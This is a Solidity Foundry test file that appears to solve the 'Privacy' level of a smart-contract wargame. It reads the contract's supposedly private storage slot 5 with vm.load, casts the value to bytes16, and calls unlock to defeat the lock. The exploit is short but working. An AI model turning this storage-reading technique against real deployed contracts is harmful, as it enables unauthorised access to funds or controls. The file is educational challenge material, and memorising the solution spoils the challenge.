// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {PrivacyFactory, Privacy} from "../levels/12_Privacy/PrivacyFactory.sol";

contract TestPrivacy is Tests {
    Privacy private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new PrivacyFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Privacy(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        bytes32 key = vm.load(levelAddress, bytes32(uint256(5)));
        level.unlock(bytes16(key));
        assertTrue(!level.locked());

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
